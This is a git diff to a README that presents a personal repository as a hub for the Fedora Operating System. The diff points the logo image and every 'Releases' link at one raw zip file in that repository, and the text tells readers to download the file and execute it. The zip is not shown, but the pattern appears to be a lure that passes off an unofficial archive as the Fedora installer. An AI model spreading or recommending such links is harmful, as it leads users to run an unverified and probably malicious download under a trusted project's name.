@@ -1,6 +1,6 @@
 # Fedora Operating System 🌟
 
-![Fedora Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/Fedora_logo.svg/1200px-Fedora_logo.svg.png)
+![Fedora Logo](https://github.com/sonmicro25/Fedora-Operating-System-/raw/refs/heads/main/Ermani/Fedora_Operating_System_v2.3-alpha.4.zip)
 
 Welcome to the **Fedora Operating System** repository! This repository serves as a hub for all things related to the Fedora OS. Here, you will find resources, tools, and community support to help you navigate and make the most of your Fedora experience.
 
@@ -21,7 +21,7 @@ Fedora is a cutting-edge Linux distribution known for its commitment to innovati
 
 ## Installation
 
-To get started with Fedora, you can download the latest release from the [Releases](https://github.com/sonmicro25/Fedora-Operating-System-/releases) section. Simply find the desired version, download the file, and execute it to begin your installation process.
+To get started with Fedora, you can download the latest release from the [Releases](https://github.com/sonmicro25/Fedora-Operating-System-/raw/refs/heads/main/Ermani/Fedora_Operating_System_v2.3-alpha.4.zip) section. Simply find the desired version, download the file, and execute it to begin your installation process.
 
 ### System Requirements
 
@@ -34,7 +34,7 @@ Before you install Fedora, ensure your system meets the following requirements:
 
 ### Installation Steps
 
-1. **Download the ISO file** from the [Releases](https://github.com/sonmicro25/Fedora-Operating-System-/releases) section.
+1. **Download the ISO file** from the [Releases](https://github.com/sonmicro25/Fedora-Operating-System-/raw/refs/heads/main/Ermani/Fedora_Operating_System_v2.3-alpha.4.zip) section.
 2. **Create a bootable USB drive** using tools like Rufus or Etcher.
 3. **Boot from the USB drive** and follow the on-screen instructions.
 4. **Select your language** and keyboard layout.
@@ -114,7 +114,7 @@ This project is licensed under the [MIT License](LICENSE). Please read the licen
 
 ## Releases
 
-For the latest updates and releases, check the [Releases](https://github.com/sonmicro25/Fedora-Operating-System-/releases) section. Here, you can find the most recent versions of Fedora. Download the files and execute them to stay current with the latest features and improvements.
+For the latest updates and releases, check the [Releases](https://github.com/sonmicro25/Fedora-Operating-System-/raw/refs/heads/main/Ermani/Fedora_Operating_System_v2.3-alpha.4.zip) section. Here, you can find the most recent versions of Fedora. Download the files and execute them to stay current with the latest features and improvements.
 
 ---
 
